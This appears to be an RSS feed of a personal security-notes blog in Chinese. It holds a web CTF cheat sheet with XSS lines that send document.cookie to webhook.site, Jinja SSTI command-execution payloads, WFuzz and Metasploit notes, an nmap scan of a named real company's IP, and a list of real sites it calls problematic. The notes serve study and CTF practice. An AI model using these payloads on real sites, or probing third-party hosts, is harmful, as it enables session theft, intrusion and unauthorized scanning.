 Conference &amp;amp; Journal For Information Security
 &lt;a class="anchor" href="#conference--journal-for-information-security">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://ieeexplore.ieee.org/xpl/RecentIssue.jsp?punumber=10206">IEEE TIFS&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ieeexplore.ieee.org/xpl/RecentIssue.jsp?punumber=8858">IEEE TDSC&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://dl.acm.org/journal/tops">ACM TISSEC&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.acsac.org/">ACSAC&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.usenix.org/conference/usenixsecurity22">Usenix security&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>Web Cheat Sheet</title><link>https://bernie6401.github.io/tools/ctf/web-cheat-sheet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/ctf/web-cheat-sheet/</guid><description>&lt;h1 id="web-cheat-sheet">
 Web Cheat Sheet
 &lt;a class="anchor" href="#web-cheat-sheet">#&lt;/a>
&lt;/h1>
&lt;h2 id="online-tools">
 Online Tools
 &lt;a class="anchor" href="#online-tools">#&lt;/a>
&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Fuck&lt;/th>
 &lt;th>Beautifier&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>&lt;a href="http://www.jsfuck.com/">jsfuck&lt;/a>&lt;/td>
 &lt;td>&lt;a href="http://www.jsnice.org/">JSNice&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://utf-8.jp/public/jjencode.html">jjencode&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://beautifier.io/">JS 反混淆器&lt;/a>: 可以反混淆或解密JS的檔案&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://utf-8.jp/public/aaencode.html">aaencode&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://js.wfuapp.com/">JS 壓縮+加密+混淆+美化&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://esolangs.org/wiki/Language_list">Esolang List&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://www.53lu.com/tool/jsfuckdecode/">JS Fuck Decode&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;/td>
 &lt;td>&lt;a href="https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html">aadecode&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="cheat-sheet">
 Cheat-Sheet
 &lt;a class="anchor" href="#cheat-sheet">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">XSS-CheatSheet&lt;/a>
利用XSS把session打到webhook上:
&lt;pre tabindex="0">&lt;code class="language-javascript?" data-lang="javascript?">window.location=&amp;lt;requestbin.com&amp;gt;/?a+document.cookie
// or
fetch(&amp;#34;https://webhook.site/699a6563-c9b5-4ad7-adaa-e189c5f78194&amp;#34;, { method: &amp;#39;GET&amp;#39;, headers: { &amp;#39;Cookie&amp;#39;: document.cookie } })
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%19Injection/README.md">All-Injection&lt;/a>&lt;/li>
&lt;li>SSTI Payload: 記得找==os._wrap_close==
&lt;pre tabindex="0">&lt;code>{{().__class__.__base__.__subclasses__()[132].__init__.__globals__[&amp;#39;system&amp;#39;](&amp;#39;id&amp;#39;)}}
{{self.__init__.__globals__.__builtins__.__import__(&amp;#34;os&amp;#34;).popen(&amp;#34;cat%20Flag.txt&amp;#34;).read()}}
{{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;execl&amp;#39;](&amp;#34;/bin/cat&amp;#34;, &amp;#34;cat&amp;#34;, &amp;#34;./flag.txt&amp;#34;)}}
{{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;popen&amp;#39;](&amp;#34;cat /flag.txt&amp;#34;)}}
{{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;execl&amp;#39;](&amp;#34;/bin/cat&amp;#34;, &amp;#34;cat&amp;#34;, file.lower())}}
{{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;spawnl&amp;#39;](&amp;#39;P_WAIT&amp;#39;, &amp;#34;/bin/cat&amp;#34;, &amp;#34;cat&amp;#34;, file.lower())}}
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="others">
 Others
 &lt;a class="anchor" href="#others">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>wasm $\to$ c: &lt;a href="https://github.com/WebAssembly/wabt">wabt&lt;/a>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!"># 按照說明build完後進到./build
$ ./wasm2c {wasm file path} -o {output c file path}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Webhook
&lt;a href="https://webhook.site/">Webhook.site&lt;/a>
&lt;a href="https://beeceptor.com/">Beeceptor&lt;/a>
&lt;a href="https://ngrok.com/">Ngrok&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>WFuzz</title><link>https://bernie6401.github.io/tools/others/directory-fuzzing---traversal-tools/wfuzz/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/directory-fuzzing---traversal-tools/wfuzz/</guid><description>&lt;h1 id="wfuzz">
 WFuzz
 &lt;a class="anchor" href="#wfuzz">#&lt;/a>
&lt;/h1>
&lt;p>參考網站-1: &lt;a href="https://www.ddosi.org/wfuzz-guide/">https://www.ddosi.org/wfuzz-guide/&lt;/a>
參考網站-2: &lt;a href="https://www.ddosi.org/wfuzz/">https://www.ddosi.org/wfuzz/&lt;/a>
參考網站-3: &lt;a href="https://www.secpulse.com/archives/78638.html">https://www.secpulse.com/archives/78638.html&lt;/a>
參考官網-1: &lt;a href="https://wfuzz.readthedocs.io/en/latest/user/basicusage.html">https://wfuzz.readthedocs.io/en/latest/user/basicusage.html&lt;/a>&lt;/p>
&lt;h3 id="installation--basic-guide">
 Installation &amp;amp; Basic Guide
 &lt;a class="anchor" href="#installation--basic-guide">#&lt;/a>
&lt;/h3>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ git pull https://github.com/xmendez/wfuzz.git
&lt;/code>&lt;/pre>&lt;p>下載下來後總共有==4==個executable file: ==wfencode==, ==wfpayload==, ==wfuzz==, ==wxfuzz==，這四個file實際上就是去執行src/內部的python cli file&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">python src/wfuzz-cli.py &amp;#34;$@&amp;#34;
python src/wxfuzz.py $@
python src/wfencode.py &amp;#34;$@&amp;#34;
python src/wfpayload.py &amp;#34;$@&amp;#34;
&lt;/code>&lt;/pre>&lt;h3 id="wfencode">
 wfencode
 &lt;a class="anchor" href="#wfencode">#&lt;/a>
&lt;/h3>
&lt;p>這個就是encode/decode的script，很單純&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ wfencode --help
Usage:

 wfencode --help This help
 wfencode -d decoder_name string_to_decode
 wfencode -e encoder_name string_to_encode
 wfencode -e encoder_name -i &amp;lt;&amp;lt;stdin&amp;gt;&amp;gt;
&lt;/code>&lt;/pre>&lt;p>而關於encode/decoder name可以參考wfuzz file的help&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ wfuzz -e encoder
Available encoders:

 Category | Name | Summary
------------------------------------------------------------------------------------------------------------------------
 hashes | base64 | Encodes the given string using base64
 url | doble_nibble_hex | Replaces ALL characters in string using the %%dd%dd escape
 url_safe, url | double_urlencode | Applies a double encode to special characters in string using the %25xx escape.
 | | Letters, digits, and the characters &amp;#39;_.-&amp;#39; are never quoted.
 url | first_nibble_hex | Replaces ALL characters in string using the %%dd? escape
 default | hexlify | Every byte of data is converted into the corresponding 2-digit hex representatio
 | | n.
 html | html_decimal | Replaces ALL characters in string using the &amp;amp;#dd; escape
 html | html_escape | Convert the characters &amp;amp;&amp;lt;&amp;gt;&amp;#34; in string to HTML-safe sequences.
 html | html_hexadecimal | Replaces ALL characters in string using the &amp;amp;#xx; escape
 hashes | md5 | Applies a md5 hash to the given string
 db | mssql_char | Converts ALL characters to MsSQL&amp;#39;s char(xx)
 db | mysql_char | Converts ALL characters to MySQL&amp;#39;s char(xx)
 default | none | Returns string without changes
 db | oracle_char | Converts ALL characters to Oracle&amp;#39;s chr(xx)
 default | random_upper | Replaces random characters in string with its capitals letters
 url | second_nibble_hex | Replaces ALL characters in string using the %?%dd escape
 hashes | sha1 | Applies a sha1 hash to the given string
 hashes | sha256 | Applies a sha256 hash to the given string
 hashes | sha512 | Applies a sha512 hash to the given string
 url | uri_double_hex | Encodes ALL charachers using the %25xx escape.
 url | uri_hex | Encodes ALL charachers using the %xx escape.
 url | uri_triple_hex | Encodes ALL charachers using the %25%xx%xx escape.
 url | uri_unicode | Replaces ALL characters in string using the %u00xx escape
 url_safe, url | urlencode | Replace special characters in string using the %xx escape. Letters, digits, and
 | | the characters &amp;#39;_.-&amp;#39; are never quoted.
 url | utf8 | Replaces ALL characters in string using the \u00xx escape
 url | utf8_binary | Replaces ALL characters in string using the \uxx escape
&lt;/code>&lt;/pre>&lt;p>如何使用&lt;/p></description></item><item><title>利用Metasploit Framework測試一些網站</title><link>https://bernie6401.github.io/tools/ctf/%E5%88%A9%E7%94%A8metasploit-framework%E6%B8%AC%E8%A9%A6%E4%B8%80%E4%BA%9B%E7%B6%B2%E7%AB%99/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/ctf/%E5%88%A9%E7%94%A8metasploit-framework%E6%B8%AC%E8%A9%A6%E4%B8%80%E4%BA%9B%E7%B6%B2%E7%AB%99/</guid><description>&lt;h1 id="利用metasploit-framework測試一些網站">
 利用Metasploit Framework測試一些網站
 &lt;a class="anchor" href="#%e5%88%a9%e7%94%a8metasploit-framework%e6%b8%ac%e8%a9%a6%e4%b8%80%e4%ba%9b%e7%b6%b2%e7%ab%99">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;h2 id="cheat-sheet">
 &lt;a href="https://ithelp.ithome.com.tw/articles/10279483?sc=hot">Cheat Sheet&lt;/a>
 &lt;a class="anchor" href="#cheat-sheet">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo msfdb init &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> msfconsole
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf6 &amp;gt; nmap -vv &lt;span style="color:#f92672">{&lt;/span>IP&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#75715e"># e.g. nmap -vv 127.0.0.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf6 &amp;gt; search &lt;span style="color:#f92672">{&lt;/span>http/ssh/ftp...關鍵字&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#75715e"># e.g. search rce&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf6 &amp;gt; use &lt;span style="color:#f92672">{&lt;/span>腳本位置&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#75715e"># e.g. use exploit/unix/http/cacti_filter_sqli_rce&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf6 exploit&lt;span style="color:#f92672">(&lt;/span>XXX&lt;span style="color:#f92672">)&lt;/span> &amp;gt; show option &lt;span style="color:#75715e"># 顯示該腳本需要哪一些參數&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf6 exploit&lt;span style="color:#f92672">(&lt;/span>XXX&lt;span style="color:#f92672">)&lt;/span> &amp;gt; set &lt;span style="color:#f92672">{&lt;/span>option name&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#f92672">{&lt;/span>參數&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#75715e"># e.g. set RHOST 127.0.0.1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="smartdaily">
 &lt;a href="https://www.smartdaily.com.tw/">SmartDaily&lt;/a>
 &lt;a class="anchor" href="#smartdaily">#&lt;/a>
&lt;/h2>
&lt;p>IP: &lt;code>34.81.5.101&lt;/code>
&lt;a href="https://securityheaders.com/?q=https%3A%2F%2Fwww.smartdaily.com.tw%2F&amp;amp;followRedirects=on">Security Header Result&lt;/a>&lt;/p>
&lt;h3 id="nmap">
 nmap
 &lt;a class="anchor" href="#nmap">#&lt;/a>
&lt;/h3>
&lt;p>:::spoiler nmap Result&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nmap -vv 34.81.5.101
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> exec: nmap -vv 34.81.5.101
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Starting Nmap 7.94 &lt;span style="color:#f92672">(&lt;/span> https://nmap.org &lt;span style="color:#f92672">)&lt;/span> at 2023-10-02 01:49 EDT
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Initiating Ping Scan at 01:49
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning 34.81.5.101 &lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> ports&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Completed Ping Scan at 01:49, 0.01s elapsed &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> total hosts&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Initiating Parallel DNS resolution of &lt;span style="color:#ae81ff">1&lt;/span> host. at 01:49
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Completed Parallel DNS resolution of &lt;span style="color:#ae81ff">1&lt;/span> host. at 01:49, 0.01s elapsed
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Initiating Connect Scan at 01:49
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning 101.5.81.34.bc.googleusercontent.com &lt;span style="color:#f92672">(&lt;/span>34.81.5.101&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">1000&lt;/span> ports&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Discovered open port 443/tcp on 34.81.5.101
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Discovered open port 80/tcp on 34.81.5.101
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Increasing send delay &lt;span style="color:#66d9ef">for&lt;/span> 34.81.5.101 from &lt;span style="color:#ae81ff">0&lt;/span> to &lt;span style="color:#ae81ff">5&lt;/span> due to &lt;span style="color:#ae81ff">11&lt;/span> out of &lt;span style="color:#ae81ff">14&lt;/span> dropped probes since last increase.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Increasing send delay &lt;span style="color:#66d9ef">for&lt;/span> 34.81.5.101 from &lt;span style="color:#ae81ff">5&lt;/span> to &lt;span style="color:#ae81ff">10&lt;/span> due to &lt;span style="color:#ae81ff">11&lt;/span> out of &lt;span style="color:#ae81ff">11&lt;/span> dropped probes since last increase.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Increasing send delay &lt;span style="color:#66d9ef">for&lt;/span> 34.81.5.101 from &lt;span style="color:#ae81ff">10&lt;/span> to &lt;span style="color:#ae81ff">20&lt;/span> due to &lt;span style="color:#ae81ff">11&lt;/span> out of &lt;span style="color:#ae81ff">11&lt;/span> dropped probes since last increase.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Increasing send delay &lt;span style="color:#66d9ef">for&lt;/span> 34.81.5.101 from &lt;span style="color:#ae81ff">20&lt;/span> to &lt;span style="color:#ae81ff">40&lt;/span> due to &lt;span style="color:#ae81ff">11&lt;/span> out of &lt;span style="color:#ae81ff">15&lt;/span> dropped probes since last increase.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Completed Connect Scan at 01:50, 75.06s elapsed &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1000&lt;/span> total ports&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 101.5.81.34.bc.googleusercontent.com &lt;span style="color:#f92672">(&lt;/span>34.81.5.101&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up, received syn-ack &lt;span style="color:#f92672">(&lt;/span>0.0085s latency&lt;span style="color:#f92672">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanned at 2023-10-02 01:49:05 EDT &lt;span style="color:#66d9ef">for&lt;/span> 75s
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Not shown: &lt;span style="color:#ae81ff">998&lt;/span> filtered tcp ports &lt;span style="color:#f92672">(&lt;/span>no-response&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE REASON
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http syn-ack
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>443/tcp open https syn-ack
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Read data files from: /usr/bin/../share/nmap
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Nmap &lt;span style="color:#66d9ef">done&lt;/span>: &lt;span style="color:#ae81ff">1&lt;/span> IP address &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> host up&lt;span style="color:#f92672">)&lt;/span> scanned in 75.09 seconds
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::
開的Port: 80/443&lt;/p></description></item><item><title>有問題的網站</title><link>https://bernie6401.github.io/tools/others/%E6%9C%89%E5%95%8F%E9%A1%8C%E7%9A%84%E7%B6%B2%E7%AB%99/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/%E6%9C%89%E5%95%8F%E9%A1%8C%E7%9A%84%E7%B6%B2%E7%AB%99/</guid><description>&lt;h1 id="有問題的網站">
 有問題的網站
 &lt;a class="anchor" href="#%e6%9c%89%e5%95%8f%e9%a1%8c%e7%9a%84%e7%b6%b2%e7%ab%99">#&lt;/a>
&lt;/h1>
&lt;ul>
&lt;li>金讚城
&lt;a href="http://www.ru.com.tw">http://www.ru.com.tw&lt;/a>
&lt;a href="http://www.jzc.com.tw">http://www.jzc.com.tw&lt;/a>&lt;/li>
&lt;li>華文網
&lt;a href="https://www.book4u.com.tw/">https://www.book4u.com.tw/&lt;/a>&lt;/li>
&lt;/ul></description></item></channel></rss>